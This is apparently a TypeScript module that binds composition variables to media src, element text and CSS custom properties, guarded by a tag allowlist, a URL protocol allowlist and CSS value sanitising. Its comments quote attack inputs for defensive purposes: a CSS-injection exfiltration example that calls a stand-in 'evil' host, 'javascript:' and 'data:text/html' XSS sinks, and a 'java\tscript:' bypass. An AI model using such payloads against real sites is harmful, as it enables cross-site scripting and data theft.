/**
 * Declarative variable bindings — the no-script consumption channel for
 * composition variables (including scoped live updates):
 *
 * - `data-var-src="id"` — sets the element's `src` from the variable value
 *   (a URL string or an image value `{url}`). Only allowed on media elements
 *   (img/video/audio/source) and only for safe URL protocols — a src on a
 *   script-executing tag or a `javascript:`/`data:text/html` value is refused.
 *   The authored src stays as the fallback when the variable resolves to nothing.
 * - `data-var-text="id"` — sets the element's OWN text from a scalar variable
 *   value. Elements with element children keep them: only the direct text
 *   node is replaced, mirroring the SDK's setOwnText semantics — a text
 *   binding must never delete nested clips or animation targets.
 * - Every scalar variable (and a font value's family name) is applied as a
 *   `--{id}` CSS custom property on its composition root, so CSS bindings
 *   like `color: var(--accent)` respond to render/preview overrides instead
 *   of only the persisted default.
 *
 * Values resolve against the element's owning composition — the same scope
 * chain the color-grading runtime uses: `__hfVariablesByComp[compId]` for
 * inlined sub-compositions, then the top-level merged `getVariables()`.
 *
 * Applied at init AND re-applied after the composition loader inlines
 * external / template sub-compositions (their DOM and per-instance scoped
 * values don't exist at init). Idempotent: re-applying writes the same
 * values.
 */

import { findVariableScope, readVariablesForElement } from "./variableScope";
import { resolveTextVariableBinding, isScalarVariableValue as isScalar } from "@hyperframes/parsers/composition";

// data-var-src only rebinds media `src` on media elements. A user-controlled
// variable value assigned to a src is an XSS surface on tags whose src executes
// (`<iframe src="javascript:…">`, `<script src="data:…">`, `<embed>`), so the
// binding is scoped to elements where `src` is purely a media reference.
const VAR_SRC_TAGS = new Set(["img", "video", "audio", "source"]);

function resolveUrl(value: unknown): string | null {
  if (typeof value === "string" && value.length > 0) return value;
  if (value !== null && typeof value === "object") {
    const url = (value as { url?: unknown }).url;
    if (typeof url === "string" && url.length > 0) return url;
  }
  return null;
}

/**
 * Protocol allowlist for a resolved media URL. Relative URLs (no scheme) resolve
 * against the page origin and are always safe. Absolute URLs are restricted to
 * http(s)/blob and image data: URIs — defense-in-depth alongside VAR_SRC_TAGS,
 * blocking `javascript:`, `data:text/html`, `file:`, etc. even if a future tag
 * slips past the element guard. Control chars are stripped before the scheme
 * test because browsers ignore them when parsing the URL (`java\tscript:`).
 */
function isSafeMediaUrl(url: string): boolean {
  // Browsers ignore ASCII control chars/whitespace when parsing a URL, so strip
  // them before reading the scheme (defeats `java\tscript:` style bypasses).
  // oxlint-disable-next-line no-control-regex -- control chars are the target here
  const normalized = url.replace(/[\u0000-\u0020]/g, "");
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(normalized);
  if (!scheme) return true;
  const proto = scheme[1]?.toLowerCase();
  if (!proto) return false;
  if (proto === "https" || proto === "http" || proto === "blob") return true;
  if (proto === "data") return /^data:image\//i.test(normalized);
  return false;
}

/**
 * Strip characters that could smuggle additional declarations or markup out of
 * a var() substitution site. A scalar value folded into `background: var(--x)`
 * or `background-image: url(var(--x))` must not be able to close the declaration
 * and inject a new one (`red; background: url(//evil?data=…)`) — none of these
 * characters is legal in a scalar variable value (string, number, color, font
 * family), so removing them is lossless for real inputs and neutralizes the
 * declaration/URL-exfiltration channel.
 */
function sanitizeCssValue(value: string): string {
  return value.replace(/[;{}<>\r\n]/g, "");
}

/** CSS custom-property value for a variable, or null when not CSS-applicable. */
function cssValueFor(value: unknown): string | null {
  if (isScalar(value)) return String(value);
  if (value !== null && typeof value === "object") {
    // Font values apply their family name; the face itself must be loaded by
    // the composition (or the media pipeline).
    const name = (value as { name?: unknown }).name;
    if (typeof name === "string" && name.length > 0) return name;
  }
  return null;
}

/**
 * Per-run memo of scope element → resolved values, so N bound elements in
 * one scope pay for one resolution (the top-level path re-parses the
 * declarations attribute on every getVariables() call).
 */
type ScopeValuesCache = Map<Element | null, Record<string, unknown>>;

function valuesForElement(el: Element, cache: ScopeValuesCache): Record<string, unknown> {
  const scope = findVariableScope(el);
  const cached = cache.get(scope);
  if (cached) return cached;
  const values = readVariablesForElement(el);
  cache.set(scope, values);
  return values;
}

/**
 * Replace the element's own text while preserving element children (nested
 * clips, animation-target spans). Mirrors the SDK's setOwnText: write the
 * first direct text node, clear the others; append when none exists.
 */
function setOwnTextPreservingChildren(el: Element, text: string): void {
  if (el.childElementCount === 0) {
    el.textContent = text;
    return;
  }
  let written = false;
  for (const node of Array.from(el.childNodes)) {
    if (node.nodeType !== Node.TEXT_NODE) continue;
    node.nodeValue = written ? "" : text;
    written = true;
  }
  if (!written) {
    el.insertBefore(el.ownerDocument.createTextNode(text), el.firstChild);
  }
}

function segmentMotionText(text: string, granularity: "word" | "grapheme"): string[] {
  const Segmenter = (
    Intl as typeof Intl & {
      Segmenter?: new (
        locale?: string,
        options?: { granularity: "word" | "grapheme" },
      ) => { segment: (value: string) => Iterable<{ segment: string }> };
    }
  ).Segmenter;
  if (!Segmenter) return Array.from(text);
  return Array.from(
    new Segmenter(undefined, { granularity }).segment(text),
    (part) => part.segment,
  );
}

function setSplitVariableBoundText(el: Element, text: string): void {
  if (el.textContent === text) return;
  const includeCharacters = el.querySelector("[data-ipw-motion-char]") !== null;
  const fragment = el.ownerDocument.createDocumentFragment();
  for (const word of segmentMotionText(text, "word")) {
    if (/^\s+$/u.test(word)) {
      fragment.append(el.ownerDocument.createTextNode(word));
      continue;
    }
    const wordSpan = el.ownerDocument.createElement("span");
    wordSpan.setAttribute("data-ipw-motion-word", "");
    wordSpan.setAttribute(
      "style",
      "display:inline-block;white-space:pre;font-weight:700;line-height:1.1;letter-spacing:-0.025em",
    );
    if (includeCharacters) {
      for (const character of segmentMotionText(word, "grapheme")) {
        const characterSpan = el.ownerDocument.createElement("span");
        characterSpan.setAttribute("data-ipw-motion-char", "");
        characterSpan.setAttribute("style", "display:inline-block");
        characterSpan.textContent = character;
        wordSpan.append(characterSpan);
      }
    } else {
      wordSpan.textContent = word;
    }
    fragment.append(wordSpan);
  }
  el.replaceChildren(fragment);
}

function setStructuredVariableBoundText(el: Element, text: string): void {

  const encodedSource = el.getAttribute("data-ipw-motion-source");
  if (encodedSource !== null) {
    try {
      if (JSON.parse(encodedSource) === text) return;
    } catch {
      // Fall through to the content-first fallback below.
    }
  }

  el.replaceChildren(el.ownerDocument.createTextNode(text));
}

function setVariableBoundText(el: Element, text: string): void {
  if (el.getAttribute("data-ipw-motion-structure") === "v1") {
    setStructuredVariableBoundText(el, text);
  } else if (el.getAttribute("data-ipw-motion-split") === "v1") {
    setSplitVariableBoundText(el, text);
  } else {
    setOwnTextPreservingChildren(el, text);
  }
}

/**
 * Composition root, matching the SDK's findRoot chain exactly — the SDK
 * persists `--{id}` defaults on this element, so the runtime must write
 * overrides to the SAME element or an inline default on a descendant would
 * shadow an override applied higher up.
 */
function findTopRoot(doc: Document): Element | null {
  return (
    doc.querySelector("[data-hf-root]") ??
    doc.getElementById("stage") ??
    doc.body?.firstElementChild ??
    doc.body
  );
}

function applyCssCustomProperties(doc: Document, cache: ScopeValuesCache, scope?: Element): void {
  // Top-level root plus every inlined sub-composition root; custom props
  // inherit, so descendants of each root see its scope's values.
  const roots = new Set<Element>();
  const topRoot = scope ?? findTopRoot(doc);
  if (topRoot) roots.add(topRoot);
  for (const el of Array.from((scope ?? doc).querySelectorAll("[data-composition-id]"))) {
    roots.add(el);
  }
  for (const root of roots) {
    const values = valuesForElement(root, cache);
    for (const [id, value] of Object.entries(values)) {
      const css = cssValueFor(value);
      if (css !== null && root instanceof HTMLElement) {
        root.style.setProperty(`--${id}`, sanitizeCssValue(css));
      }
    }
  }
}

export function applyVariableBindings(doc: Document, scope?: Element): void {
  const cache: ScopeValuesCache = new Map();
  applyCssCustomProperties(doc, cache, scope);

  for (const el of Array.from((scope ?? doc).querySelectorAll("[data-var-src]"))) {
    const id = el.getAttribute("data-var-src")?.trim();
    if (!id) continue;
    // Only media elements may take a variable-driven src (see VAR_SRC_TAGS) — a
    // src on <iframe>/<script>/<embed> is a code-execution sink, not a media ref.
    if (!VAR_SRC_TAGS.has(el.tagName.toLowerCase())) {
      console.warn(
        `[hyperframes] Ignoring data-var-src on <${el.tagName.toLowerCase()}>: variable-bound src is only allowed on ${Array.from(VAR_SRC_TAGS).join("/")}.`,
      );
      continue;
    }
    const url = resolveUrl(valuesForElement(el, cache)[id]);
    if (url === null) continue;
    if (!isSafeMediaUrl(url)) {
      console.warn(`[hyperframes] Ignoring data-var-src="${id}": unsafe URL protocol.`);
      continue;
    }
    el.setAttribute("src", url);
  }

  for (const el of Array.from((scope ?? doc).querySelectorAll("[data-var-text]"))) {
    const id = el.getAttribute("data-var-text")?.trim();
    if (!id) continue;
    const value = resolveTextVariableBinding(id, valuesForElement(el, cache));
    if (isScalar(value)) setVariableBoundText(el, String(value));
  }
}

// Composition authors subscribe to this shared binding transaction for native
// geometry updates. Validation runs before DOM bindings or persistence.
const variableListeners = new WeakMap<Element, Set<(values: Record<string, unknown>) => void>>();

export function onVariablesChange(root: Element, listener: (values: Record<string, unknown>) => void): () => void {
  const listeners = variableListeners.get(root) ?? new Set();
  listeners.add(listener);
  variableListeners.set(root, listeners);
  return () => listeners.delete(listener);
}

export function updateVariables(root: Element, patch: Record<string, unknown>): boolean {
  const scope = findVariableScope(root) ?? root;
  const bound = [root, ...Array.from(root.querySelectorAll("[data-var-text], [data-var-src]"))];
  const listeners = variableListeners.get(root);
  const bindingIds = new Set(bound.flatMap((el) => [el.getAttribute("data-var-text"), el.getAttribute("data-var-src")]).filter((id): id is string => Boolean(id)).map((id) => id.startsWith("/") ? id.split("/")[1]?.replace(/~1/g, "/").replace(/~0/g, "~") : id));
  if (!listeners?.size && Object.keys(patch).some((id) => !bindingIds.has(id))) return false;
  const previous = readVariablesForElement(root);
  const next = { ...previous, ...patch };
  const win = (root.ownerDocument.defaultView ?? window) as Window & {
    __hfVariablesByComp?: Record<string, Record<string, unknown>>;
    __hfVariables?: Record<string, unknown>;
  };
  const id = scope.getAttribute("data-composition-id");
  if (!id) return false;
  const bank = win.__hfVariablesByComp ??= {};
  const oldEntry = bank[id];
  bank[id] = next;
  try {
    for (const listener of listeners ?? []) listener(next);
    applyVariableBindings(root.ownerDocument, root);
  } catch (error) {
    if (oldEntry) bank[id] = oldEntry; else delete bank[id];
    for (const listener of listeners ?? []) listener(previous);
    applyVariableBindings(root.ownerDocument, root);
    throw error;
  }
  return true;
}
